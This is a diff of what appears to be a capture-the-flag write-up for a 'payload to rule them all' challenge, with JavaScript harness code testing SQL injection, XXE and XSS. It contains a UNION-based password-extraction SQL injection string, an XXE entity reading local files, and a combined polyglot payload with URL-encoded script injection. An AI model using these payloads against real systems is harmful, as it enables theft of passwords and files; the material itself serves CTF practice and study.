@@ -162,7 +162,7 @@ function main() {
 }
 
 ```
-  if we try this file locally it returns true , so first test is done.
+  if we access this file locally it returns true , so first test is done.
   
   XXE test 
   xxe payload 
@@ -185,7 +185,7 @@ function test_xxe(payload) {
 
 unction main() {
 	let sql_payload = "' UNION SELECT 1, 2 , password FROM users -- - "
-	let xxe_payload = "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///root/ctf/a_payload_to_rule_them_all/src/xxe_secret'>]><root>&test;</root>"
+	let xxe_payload = "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///root/ctf/payload/src/xxe_secret'>]><root>&test;</root>"
 	
 	//var sqli = test_sqli(payload)
 	var xxe = test_xxe(xxe_payload)
@@ -203,8 +203,24 @@ unction main() {
 }
 
 ```
-if we access this file locally it returns true , so first test is done.
+if we access this file locally it returns true , so second test is done.
   
+A Payload to rule them all :
+```html 
+unction main() {
+	
+let payload ="<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///home/gnx/scriptxxe_secret\">]><root><textarea>&test;</textarea><script>' UNION SELECT 1, 2 , password FROM users -- -</script><c>%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3e%78%73%73%3d%31</c></root>"
 
+	var sqli = test_sqli(payload)
+	var xxe = test_xxe(payload)
+	var xss = test_xss(payload)
 
+	Promise.all([sqli,xss]).then( function( values ){
+		console.log('SQL: ' + values[0])
+		console.log('XEE: ' + xxe)
+		console.log('xss: ' + values[1])
 
+		process.exit(0)
+	})
+```
+if we run this file locally it returns true , so test is done.
